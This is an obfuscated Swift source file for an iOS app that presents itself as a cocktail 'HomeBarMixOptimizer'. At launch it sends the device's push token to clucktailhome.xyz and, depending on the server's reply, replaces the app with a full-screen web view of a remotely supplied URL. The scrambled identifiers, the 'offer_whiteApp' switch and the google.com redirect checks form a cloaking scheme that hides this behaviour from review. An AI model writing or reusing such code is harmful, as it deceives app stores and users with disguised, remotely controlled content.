
import UIKit
import SwiftUI
import FirebaseCore
import FirebaseMessaging
import UserNotifications

extension Notification.Name {
    static let pushPermissionResolved = Notification.Name("pushPermissionResolved")
    static let fcmTokenReceived = Notification.Name("fcmTokenReceived")
}

class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?

    static var ngobrclhxyhuwlruoau = UIInterfaceOrientationMask.all
    func application(_ acloomeewksjvzfepq: UIApplication, supportedInterfaceOrientationsFor zqrguluqupispk: UIWindow?) -> UIInterfaceOrientationMask {
        AppDelegate.ngobrclhxyhuwlruoau
    }

    func application(_ ezoeawoyxquguhpuopwq: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {

        FirebaseApp.configure()

        Messaging.messaging().delegate = self

        UNUserNotificationCenter.current().delegate = self
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { jkxnuaemuiqgnafimhi, ltuiyxwemlnjqlobag in
            if let punehogayboogfagvzef = ltuiyxwemlnjqlobag {
            }
            DispatchQueue.main.async {
                NotificationCenter.default.post(name: .pushPermissionResolved, object: nil)
            }
        }

        ezoeawoyxquguhpuopwq.registerForRemoteNotifications()

        Messaging.messaging().token { vvgwjlczevgsxrn, rpqeebeapoloiu in
            if let token = vvgwjlczevgsxrn {
                UserDefaults.standard.set(token, forKey: "FCMToken")
                DispatchQueue.main.async {
                    NotificationCenter.default.post(name: .fcmTokenReceived, object: nil)
                }
            } else if let zejiycepaimjieu = rpqeebeapoloiu {
            }
        }

        return true
    }


    func application(_ ckhyayaabzbwoyopulsee: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken yickenaharltxx: Data) {
        let fonloateoqofeoetio = yickenaharltxx.map { String(format: "%02.2hhx", $0) }.joined()
        Messaging.messaging().apnsToken = yickenaharltxx
    }

    func application(_ zwmywssbfkiufaxyoemnwq: UIApplication, didFailToRegisterForRemoteNotificationsWithError fajfojvwejqwow: Error) {
    }
}


extension AppDelegate: UNUserNotificationCenterDelegate {

    func userNotificationCenter(_ kulxnejuepgtptjki: UNUserNotificationCenter,
                                willPresent thjhgmnbvzyayjoeei: UNNotification,
                                withCompletionHandler vvtcilquzphjpo: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = thjhgmnbvzyayjoeei.request.content.userInfo
        vvtcilquzphjpo([.banner, .badge, .sound])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive ofaxsrxzfzwifokrftoiw: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let oupwnsiieialwybpvas = ofaxsrxzfzwifokrftoiw.notification.request.content.userInfo
        completionHandler()
    }
}


extension AppDelegate: MessagingDelegate {

    func messaging(_ pmhappefechaezicloeia: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        guard let iipuviczknueovffpuzks = fcmToken else {
            return
        }
        UserDefaults.standard.set(iipuviczknueovffpuzks, forKey: "FCMToken")
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .fcmTokenReceived, object: nil)
        }
    }
}


struct Eboelummnuohvvx {
    enum Eiooucjosazlmuyhkoyhge {
        static var fqiikiiyfezyemnxfo: String { "https://clucktailhome.xyz/clucktailhomemix.json" }
    }

    enum Trzhkeikitgjlghonvj {
        static var ypahiqbeixugntv: String { "Content-Type" }
        static var llgmlueevystoiheoip: String { "application/json" }
        static var xquxacawyafocaviovw: String { "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" }
        static var bpvzapaplrikioar: String { "Unknown error" }
        static var tjobuheibcyoza: String { "Error: " }
        static var ebjlrkorvuanpi: String { "firstOpen" }
        static var jagsefuiiljefostiwz: String { "wasOpened" }
        static var ooomxpbctpokjwynacuqf: String { "orientation" }
    }
}


struct Vivwubuieznore: View {
    @State var zgtehwoonczgbjnejkaoj: Bool = true
    let czkxztgoiezfvein: String

    var body: some View {
        ZStack {
            Tssammoqvjvbcuauyibefx(bfgzrpncnficuaahjwak: czkxztgoiezfvein, oiwejintffuaxuvhrjlg: nil)
                .background(Color.black.ignoresSafeArea())
                .edgesIgnoringSafeArea(.bottom)
                .blur(radius: zgtehwoonczgbjnejkaoj ? 15 : 0)

            if zgtehwoonczgbjnejkaoj {
                ProgressView()
                    .controlSize(.large)
                    .tint(.pink)
            }
        }
        .onAppear {
            AppDelegate.ngobrclhxyhuwlruoau = .all

            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                zgtehwoonczgbjnejkaoj = false
            }
        }
    }
}

private enum Teksfzacauxajepwc: Equatable {
    case bowqoirafxrjjsji
    case moaleiyriiqsftfgjw
    case voaiixutjlpyqizibycs(String)
}

@main
struct HomeBarMixOptimizerApp: App {
    @State private var cbmfioxinjuihbxjcrvco: Teksfzacauxajepwc = .bowqoirafxrjjsji
    @State private var bjeueonaippppmrxisuiu: Bool = false
    @State private var qvzbpijwjarsstkk: Bool = false

    @AppStorage(Eboelummnuohvvx.Trzhkeikitgjlghonvj.ebjlrkorvuanpi) var uboxpvcyoapilemcjiilo: Bool = true
    @AppStorage(Eboelummnuohvvx.Trzhkeikitgjlghonvj.jagsefuiiljefostiwz) var kxxuuujokylzhfqmzhw: Bool = false
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate

    var body: some Scene {
        WindowGroup {
            Group {
                switch cbmfioxinjuihbxjcrvco {
                case .bowqoirafxrjjsji:
                    SplashView()
                        .ignoresSafeArea()
                        .onAppear {
                            AppDelegate.ngobrclhxyhuwlruoau = .portrait
                            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: Eboelummnuohvvx.Trzhkeikitgjlghonvj.ooomxpbctpokjwynacuqf)
                            kxxuuujokylzhfqmzhw = true

                            if !uboxpvcyoapilemcjiilo {
                                if let uivnaecitxrusyhfaizotb = UserDefaults.standard.string(forKey: "savedFinalUrl"),
                                   !uivnaecitxrusyhfaizotb.isEmpty,
                                   !sijpwsetxpiwoeiuacjhoj(uivnaecitxrusyhfaizotb) {
                                    iciwaaesoakoyg(uivnaecitxrusyhfaizotb) { isValid in
                                        if isValid {
                                            cbmfioxinjuihbxjcrvco = .voaiixutjlpyqizibycs(uivnaecitxrusyhfaizotb)
                                        } else {
                                            UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                                            cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                                        }
                                    }
                                } else {
                                    if let uivnaecitxrusyhfaizotb = UserDefaults.standard.string(forKey: "savedFinalUrl"),
                                       sijpwsetxpiwoeiuacjhoj(uivnaecitxrusyhfaizotb) {
                                        UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                                    }
                                    cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                                }
                            } else {
                                DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                                    guard self.cbmfioxinjuihbxjcrvco == .bowqoirafxrjjsji else { return }
                                    qvzbpijwjarsstkk = true
                                    if bjeueonaippppmrxisuiu {
                                        otltfkoswxkkgu()
                                    }
                                }
                            }
                        }
                        .onReceive(NotificationCenter.default.publisher(for: .pushPermissionResolved)) { _ in
                            guard uboxpvcyoapilemcjiilo else { return }
                            bjeueonaippppmrxisuiu = true
                            if qvzbpijwjarsstkk {
                                otltfkoswxkkgu()
                            }
                        }
                        .onReceive(NotificationCenter.default.publisher(for: .fcmTokenReceived)) { _ in
                            guard uboxpvcyoapilemcjiilo else { return }
                            qvzbpijwjarsstkk = true
                            if bjeueonaippppmrxisuiu {
                                otltfkoswxkkgu()
                            }
                        }

                case .moaleiyriiqsftfgjw:
                    HomeBarMixOptimizer()

                case .voaiixutjlpyqizibycs(let jhuuarvfkoxvum):
                    Tssammoqvjvbcuauyibefx(bfgzrpncnficuaahjwak: jhuuarvfkoxvum, oiwejintffuaxuvhrjlg: {
                        UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                        cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                    })
                    .preferredColorScheme(.dark)
                    .onAppear {
                        AppDelegate.ngobrclhxyhuwlruoau = .all
                    }
                }
            }
        }
    }

    private func sijpwsetxpiwoeiuacjhoj(_ qqjxsnayeoguzyeta: String) -> Bool {
        guard let vobisnqvtzhuza = URL(string: qqjxsnayeoguzyeta), let lqnfmanznaqzprqgeojmgo = vobisnqvtzhuza.host?.lowercased() else { return false }
        return lqnfmanznaqzprqgeojmgo == "google.com" || lqnfmanznaqzprqgeojmgo == "www.google.com"
    }

    private func iciwaaesoakoyg(_ emphqoutjufaauwqltupx: String, completion: @escaping (Bool) -> Void) {
        guard let uatxuxyqfnceqea = URL(string: emphqoutjufaauwqltupx) else {
            DispatchQueue.main.async { completion(false) }
            return
        }

        var gvtxnlyexvzhae = URLRequest(url: uatxuxyqfnceqea)
        gvtxnlyexvzhae.httpMethod = "HEAD"
        gvtxnlyexvzhae.setValue(Eboelummnuohvvx.Trzhkeikitgjlghonvj.xquxacawyafocaviovw, forHTTPHeaderField: "User-Agent")
        gvtxnlyexvzhae.timeoutInterval = 7

        let zwjzbaosklliuqgemwk = URLSessionConfiguration.default
        let iftxhkzbooecchmywv = URLSession(configuration: zwjzbaosklliuqgemwk, delegate: Ueefvuwlagbqekmb.vmtcwnlrtrkzilfr, delegateQueue: nil)

        let uepheixeibcbkmmo = iftxhkzbooecchmywv.dataTask(with: gvtxnlyexvzhae) { _, xqhluiqepgbwwtmjkogb, jwjpfgimbmeevgvlagbjm in
            if jwjpfgimbmeevgvlagbjm != nil {
                DispatchQueue.main.async { completion(false) }
                return
            }

            guard let lauuuuaaiymvteur = xqhluiqepgbwwtmjkogb as? HTTPURLResponse else {
                DispatchQueue.main.async { completion(false) }
                return
            }

            let iaotriumeaeakesaoao = lauuuuaaiymvteur.url
            if self.sijpwsetxpiwoeiuacjhoj(iaotriumeaeakesaoao?.absoluteString ?? "") {
                UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                DispatchQueue.main.async { completion(false) }
                return
            }

            if let cobkraaesgneytuvjx = lauuuuaaiymvteur.value(forHTTPHeaderField: "Location"),
               self.sijpwsetxpiwoeiuacjhoj(cobkraaesgneytuvjx) {
                UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                DispatchQueue.main.async { completion(false) }
                return
            }

            let yxemwqakisiuuch = lauuuuaaiymvteur.statusCode < 500
            DispatchQueue.main.async { completion(yxemwqakisiuuch) }
        }
        uepheixeibcbkmmo.resume()
    }

    private func lytsxbjoeowozwjypvmvwv(_ cpsrozqpehecwxbnzopr: String) {
        if sijpwsetxpiwoeiuacjhoj(cpsrozqpehecwxbnzopr) {
            UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
            self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
            self.uboxpvcyoapilemcjiilo = false
            return
        }

        iciwaaesoakoyg(cpsrozqpehecwxbnzopr) { isValid in
            if isValid {
                UserDefaults.standard.set(cpsrozqpehecwxbnzopr, forKey: "savedFinalUrl")
                self.cbmfioxinjuihbxjcrvco = .voaiixutjlpyqizibycs(cpsrozqpehecwxbnzopr)
                self.uboxpvcyoapilemcjiilo = false
            } else {
                UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                self.uboxpvcyoapilemcjiilo = false
            }
        }
    }

    private func otltfkoswxkkgu() {
        var wwuxucoeilqlvbuq = Eboelummnuohvvx.Eiooucjosazlmuyhkoyhge.fqiikiiyfezyemnxfo

        if let ekpwxvosrumwszku = UserDefaults.standard.string(forKey: "FCMToken"), !ekpwxvosrumwszku.isEmpty  {
            let aliocowamyttpewjaguk = ekpwxvosrumwszku.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? ekpwxvosrumwszku
            wwuxucoeilqlvbuq += "?fcm_token=\(aliocowamyttpewjaguk)"
        }


        guard let egipwfahteccpbyaegb = URL(string: wwuxucoeilqlvbuq) else {
            cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
            uboxpvcyoapilemcjiilo = false
            return
        }


        var ukuymoalrklzmutueoa = URLRequest(url: egipwfahteccpbyaegb)
        ukuymoalrklzmutueoa.httpMethod = "GET"
        ukuymoalrklzmutueoa.setValue(Eboelummnuohvvx.Trzhkeikitgjlghonvj.llgmlueevystoiheoip, forHTTPHeaderField: Eboelummnuohvvx.Trzhkeikitgjlghonvj.ypahiqbeixugntv)
        ukuymoalrklzmutueoa.setValue(Eboelummnuohvvx.Trzhkeikitgjlghonvj.xquxacawyafocaviovw, forHTTPHeaderField: "User-Agent")

        URLSession.shared.dataTask(with: ukuymoalrklzmutueoa) { ekhjgbeoowgaalnxolcusm, fmqwqlbzjrxauciabgr, error in
            if let error = error {
                DispatchQueue.main.async {
                    self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                    self.uboxpvcyoapilemcjiilo = false
                }
                return
            }

            if let asieivyuisjmbtlh = fmqwqlbzjrxauciabgr as? HTTPURLResponse {
                if asieivyuisjmbtlh.statusCode != 200 {
                    DispatchQueue.main.async {
                        self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                        self.uboxpvcyoapilemcjiilo = false
                    }
                    return
                }
            }

            guard let ekhjgbeoowgaalnxolcusm = ekhjgbeoowgaalnxolcusm, !ekhjgbeoowgaalnxolcusm.isEmpty else {
                DispatchQueue.main.async {
                    self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                    self.uboxpvcyoapilemcjiilo = false
                }
                return
            }

            var nsioovxjmisayappuabn = ekhjgbeoowgaalnxolcusm
            if ekhjgbeoowgaalnxolcusm.count >= 3, ekhjgbeoowgaalnxolcusm.prefix(3).elementsEqual([0xEF, 0xBB, 0xBF]) {
                nsioovxjmisayappuabn = ekhjgbeoowgaalnxolcusm.dropFirst(3)
            }

            guard var tycqihtempoufhws = String(data: nsioovxjmisayappuabn, encoding: .utf8) else {
                DispatchQueue.main.async {
                    self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                    self.uboxpvcyoapilemcjiilo = false
                }
                return
            }

            tycqihtempoufhws = tycqihtempoufhws
                .replacingOccurrences(of: "\u{00A0}", with: " ")
                .replacingOccurrences(of: "\u{FEFF}", with: "")
                .trimmingCharacters(in: .whitespacesAndNewlines)


            guard let bfsxesgesaajoifgqexe = tycqihtempoufhws.data(using: .utf8) else {
                DispatchQueue.main.async {
                    self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                    self.uboxpvcyoapilemcjiilo = false
                }
                return
            }

            do {
                if let kuhmktgmonqmijijmhhe = try JSONSerialization.jsonObject(with: bfsxesgesaajoifgqexe, options: [.allowFragments]) as? [[String: Any]] {

                    let tmkbntaptnbemfo = kuhmktgmonqmijijmhhe.count > 1 || !kuhmktgmonqmijijmhhe.contains { ($0["name"] as? String) == "offer_whiteApp" }

                    if tmkbntaptnbemfo {
                        DispatchQueue.main.async {
                            UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                            self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                            self.uboxpvcyoapilemcjiilo = false
                        }
                    } else if let eeozaqpullsaamelrex = kuhmktgmonqmijijmhhe.first,
                              let ynfevalqrexauen = eeozaqpullsaamelrex["google_link"] as? String,
                              !ynfevalqrexauen.isEmpty {

                        DispatchQueue.main.async {
                            self.lytsxbjoeowozwjypvmvwv(ynfevalqrexauen)
                        }
                    } else {
                        DispatchQueue.main.async {
                            self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                            self.uboxpvcyoapilemcjiilo = false
                        }
                    }
                } else {
                    DispatchQueue.main.async {
                        self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                        self.uboxpvcyoapilemcjiilo = false
                    }
                }
            } catch {
                DispatchQueue.main.async {
                    self.cbmfioxinjuihbxjcrvco = .moaleiyriiqsftfgjw
                    self.uboxpvcyoapilemcjiilo = false
                }
            }
        }.resume()
    }
}

final class Ueefvuwlagbqekmb: NSObject, URLSessionTaskDelegate {
    static let vmtcwnlrtrkzilfr = Ueefvuwlagbqekmb()

    private static func xmoilutafeaauze(_ zbbavpihtojfmocgoqaakl: URL?) -> Bool {
        guard let wombmvvjmqjpkipbwonoyi = zbbavpihtojfmocgoqaakl?.host?.lowercased() else { return false }
        return wombmvvjmqjpkipbwonoyi == "google.com" || wombmvvjmqjpkipbwonoyi == "www.google.com"
    }

    func urlSession(_ vifonelgefifbeyciwia: URLSession, task: URLSessionTask, willPerformHTTPRedirection ixxakowazebgspjn: HTTPURLResponse, newRequest qseoeuxzuqzamupeacutzb: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        if Ueefvuwlagbqekmb.xmoilutafeaauze(qseoeuxzuqzamupeacutzb.url) {
            completionHandler(nil)
            return
        }
        completionHandler(qseoeuxzuqzamupeacutzb)
    }
}

import SwiftUI
import WebKit

struct Yraekajrozvubvzefwpaum: UIViewRepresentable {
    let kuyzijhhkojvojtg: String
    var jjawstoccyeewbxb: (() -> Void)? = nil
    @Binding var aqolqzauwvvuopealfbvt: WKWebView?
    @Binding var uruppeezlpnxtrsyfpcf: WKWebView?

    func makeUIView(context: Context) -> WKWebView {
        let xhaaoyklrpnfhouu = WKPreferences()
        xhaaoyklrpnfhouu.javaScriptCanOpenWindowsAutomatically = true

        let qzjfweoejnerkhkknyi = WKWebViewConfiguration()
        qzjfweoejnerkhkknyi.preferences = xhaaoyklrpnfhouu
        qzjfweoejnerkhkknyi.allowsInlineMediaPlayback = true
        qzjfweoejnerkhkknyi.defaultWebpagePreferences.allowsContentJavaScript = true
        qzjfweoejnerkhkknyi.applicationNameForUserAgent = Eboelummnuohvvx.Trzhkeikitgjlghonvj.xquxacawyafocaviovw

        let bkljcsehnupfunmougq = WKWebView(frame: .zero, configuration: qzjfweoejnerkhkknyi)
        bkljcsehnupfunmougq.navigationDelegate = context.coordinator
        bkljcsehnupfunmougq.uiDelegate = context.coordinator
        bkljcsehnupfunmougq.allowsBackForwardNavigationGestures = true
        bkljcsehnupfunmougq.isOpaque = false
        bkljcsehnupfunmougq.backgroundColor = .black
        bkljcsehnupfunmougq.scrollView.backgroundColor = .black
        bkljcsehnupfunmougq.alpha = 0
        context.coordinator.wvijhmologxicpyauk = bkljcsehnupfunmougq

        if let iqqciiueheusuwz = URL(string: kuyzijhhkojvojtg) {
            bkljcsehnupfunmougq.load(URLRequest(url: iqqciiueheusuwz))
        }

        DispatchQueue.main.async { self.aqolqzauwvvuopealfbvt = bkljcsehnupfunmougq }
        return bkljcsehnupfunmougq
    }

    func updateUIView(_ fqoetmfckmjojhuifeaza: WKWebView, context: Context) {}

    func makeCoordinator() -> Coordinator {
        Coordinator(iopaongaiiuopqpribsoni: jjawstoccyeewbxb, pvxqnkekzxjiyfqob: $uruppeezlpnxtrsyfpcf)
    }

    final class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        private let uprfmufuectwaqapazwt: (() -> Void)?
        @Binding var hbklexjmnlugteispbcnin: WKWebView?
        weak var wvijhmologxicpyauk: WKWebView?

        init(iopaongaiiuopqpribsoni: (() -> Void)?, pvxqnkekzxjiyfqob: Binding<WKWebView?>) {
            self.uprfmufuectwaqapazwt = iopaongaiiuopqpribsoni
            self._hbklexjmnlugteispbcnin = pvxqnkekzxjiyfqob
            super.init()
        }

        func webView(_ qbxemaoacoauiik: WKWebView, createWebViewWith rapiueotlgaqqiqhkseuq: WKWebViewConfiguration, for jgemclgngizpelakbeefoi: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if jgemclgngizpelakbeefoi.targetFrame?.isMainFrame != true {
                let ghwrjreyjlajwm = WKWebView(frame: qbxemaoacoauiik.bounds, configuration: rapiueotlgaqqiqhkseuq)
                ghwrjreyjlajwm.navigationDelegate = self
                ghwrjreyjlajwm.uiDelegate = self
                qbxemaoacoauiik.addSubview(ghwrjreyjlajwm)
                DispatchQueue.main.async { self.hbklexjmnlugteispbcnin = ghwrjreyjlajwm }
                return ghwrjreyjlajwm
            }
            return nil
        }

        func webViewDidClose(_ fyivxwlzooobxvtepwi: WKWebView) {
            if fyivxwlzooobxvtepwi == hbklexjmnlugteispbcnin {
                hbklexjmnlugteispbcnin?.removeFromSuperview()
                DispatchQueue.main.async { self.hbklexjmnlugteispbcnin = nil }
            }
        }

        private func vepzuixygtihfvq(_ cpnnxfiyiibnukjo: URL?) -> Bool {
            guard let uvjsxmyagnuamnem = cpnnxfiyiibnukjo else { return false }
            let szubqqfiephoksxita = uvjsxmyagnuamnem.absoluteString.lowercased()
            let ebnuuaaijesjwvhuzsa = uvjsxmyagnuamnem.host?.lowercased() ?? ""
            if ebnuuaaijesjwvhuzsa.contains("accounts.google.com") { return true }
            if ebnuuaaijesjwvhuzsa.contains("googleapis.com") && szubqqfiephoksxita.contains("oauth") { return true }
            return false
        }

        private func kiwrlwujabhugc(_ olnietymslsoohtwfq: URL?) -> Bool {
            guard let olnietymslsoohtwfq = olnietymslsoohtwfq, let ybywgcbyjesuosioux = olnietymslsoohtwfq.host?.lowercased() else { return false }
            return ybywgcbyjesuosioux == "google.com" || ybywgcbyjesuosioux == "www.google.com"
        }

        func webView(_ bomwyaggfqxlctsjipoalu: WKWebView, decidePolicyFor fxvqaebaacswjm: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {

            let gujeruilabsyyogiie = """
        var as=document.getElementsByTagName('a');
        if(as){for (var i=0;i<as.length;i++){
            if(as[i].getAttribute('target')=='_blank'){as[i].setAttribute('target','_self');}
        }}
        """
            bomwyaggfqxlctsjipoalu.evaluateJavaScript(gujeruilabsyyogiie, completionHandler: nil)

            let uxjhbamnepjsahwluie = fxvqaebaacswjm.request.url

            if let uxjhbamnepjsahwluie = uxjhbamnepjsahwluie, kiwrlwujabhugc(uxjhbamnepjsahwluie) {
                decisionHandler(.cancel)
                DispatchQueue.main.async {
                    UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                    self.uprfmufuectwaqapazwt?()
                }
                return
            }

            if fxvqaebaacswjm.navigationType == .other,
               vepzuixygtihfvq(uxjhbamnepjsahwluie),
               let cttqtioijamjewrfcqa = bomwyaggfqxlctsjipoalu.url?.host?.lowercased(),
               !cttqtioijamjewrfcqa.contains("google.com") {
                decisionHandler(.cancel)
                let awnflamuqwnkgoko = bomwyaggfqxlctsjipoalu.backForwardList.backList
                if let ouxeomlbeefewpienouvb = awnflamuqwnkgoko.last(where: {
                    let hoqagwlumkkbos = $0.url.host?.lowercased() ?? ""
                    let aysmhsfluokjyeagqvxm = $0.url.absoluteString.lowercased()
                    return !hoqagwlumkkbos.contains("google.com") && !aysmhsfluokjyeagqvxm.contains("accounts.google.com")
                }) {
                    bomwyaggfqxlctsjipoalu.go(to: ouxeomlbeefewpienouvb)
                }
                return
            }

            if fxvqaebaacswjm.navigationType == .linkActivated {
                bomwyaggfqxlctsjipoalu.load(fxvqaebaacswjm.request)
                decisionHandler(.cancel)
                return
            }
            decisionHandler(.allow)
        }

        func webView(_ qhkgazahnkooopao: WKWebView, decidePolicyFor jnphriulwxuvula: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
            if kiwrlwujabhugc(jnphriulwxuvula.response.url) {
                decisionHandler(.cancel)
                DispatchQueue.main.async {
                    UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                    self.uprfmufuectwaqapazwt?()
                }
                return
            }
            decisionHandler(.allow)
        }

        func webView(_ wssoeoaubzeohcx: WKWebView, didFinish bonlpkpsfewtfbnux: WKNavigation!) {
            if kiwrlwujabhugc(wssoeoaubzeohcx.url) {
                DispatchQueue.main.async {
                    UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                    self.uprfmufuectwaqapazwt?()
                }
                return
            }

            wssoeoaubzeohcx.allowsBackForwardNavigationGestures = true
            wssoeoaubzeohcx.configuration.mediaTypesRequiringUserActionForPlayback = .all
            wssoeoaubzeohcx.configuration.allowsInlineMediaPlayback = false
            wssoeoaubzeohcx.configuration.allowsAirPlayForMediaPlayback = false

            if wssoeoaubzeohcx.alpha == 0 {
                UIView.animate(withDuration: 0.15) { wssoeoaubzeohcx.alpha = 1 }
            }

            if let uaxizhuiklbmjia = wssoeoaubzeohcx.url?.absoluteString {
                if !vepzuixygtihfvq(wssoeoaubzeohcx.url) && !kiwrlwujabhugc(wssoeoaubzeohcx.url) {
                    UserDefaults.standard.set(uaxizhuiklbmjia, forKey: "savedFinalUrl")
                }
            }
        }
    }
}

struct Tssammoqvjvbcuauyibefx: View {
    let bfgzrpncnficuaahjwak: String
    var oiwejintffuaxuvhrjlg: (() -> Void)? = nil
    @State private var pknrjbxtoipijo: WKWebView?
    @State private var vbfkianiutigfgfcejk: WKWebView?

    var body: some View {
        ZStack {
            Yraekajrozvubvzefwpaum(kuyzijhhkojvojtg: bfgzrpncnficuaahjwak,
                    jjawstoccyeewbxb: oiwejintffuaxuvhrjlg,
                    aqolqzauwvvuopealfbvt: $pknrjbxtoipijo,
                    uruppeezlpnxtrsyfpcf: $vbfkianiutigfgfcejk)
            .background(Color.black.ignoresSafeArea())

            VStack {
                HStack {
                    Button(action: { gvxrievaafayfitpt() }) {
                        Image(systemName: "chevron.backward.circle.fill")
                            .resizable()
                            .frame(width: 20, height: 20)
                            .foregroundColor(.white)
                    }
                    .padding(.leading, 20)
                    .padding(.top, 15)
                    Spacer()
                }
                Spacer()
            }
            .ignoresSafeArea()
        }
        .statusBarHidden(true)
    }

    private func kpxelioffkikmxt(_ nawvyfxozeyuox: URL) -> Bool {
        let akpxaormfnloarfrzkb = nawvyfxozeyuox.absoluteString.lowercased()
        let xhaswrvboxwqeubaeq = nawvyfxozeyuox.host?.lowercased() ?? ""
        if xhaswrvboxwqeubaeq.contains("accounts.google.com") || xhaswrvboxwqeubaeq.contains("googleapis.com") { return true }
        if akpxaormfnloarfrzkb.contains("accounts.google.com") || akpxaormfnloarfrzkb.contains("oauth2") && akpxaormfnloarfrzkb.contains("google") { return true }
        return false
    }

    private func gvxrievaafayfitpt() {
        if let snorljpvylgsysoie = vbfkianiutigfgfcejk {
            snorljpvylgsysoie.removeFromSuperview()
            vbfkianiutigfgfcejk = nil
            return
        }

        guard let tryaaavesflpajbx = pknrjbxtoipijo, tryaaavesflpajbx.canGoBack else { return }

        let wqfqvkxphvlmzgiiy = tryaaavesflpajbx.url.map { kpxelioffkikmxt($0) } ?? false

        if wqfqvkxphvlmzgiiy {
            let sjwrqiybunoregzii = tryaaavesflpajbx.backForwardList.backList
            if let vaxarjlrhjvbiarppou = sjwrqiybunoregzii.last(where: { !kpxelioffkikmxt($0.url) }) {
                tryaaavesflpajbx.go(to: vaxarjlrhjvbiarppou)
            } else {
                tryaaavesflpajbx.goBack()
            }
        } else {
            tryaaavesflpajbx.goBack()
        }
    }
}

struct HomeBarMixOptimizer: View {
    @StateObject private var dataStore = AppDataStore()

    init() {
        UITableView.appearance().showsVerticalScrollIndicator = false
        UITableView.appearance().showsHorizontalScrollIndicator = false
        UITextView.appearance().showsVerticalScrollIndicator = false
        UITextView.appearance().showsHorizontalScrollIndicator = false
    }

    var body: some View {
        RootTabView()
            .environmentObject(dataStore)
            .environment(\.hbAppTheme, dataStore.hbAppTheme)
    }
}
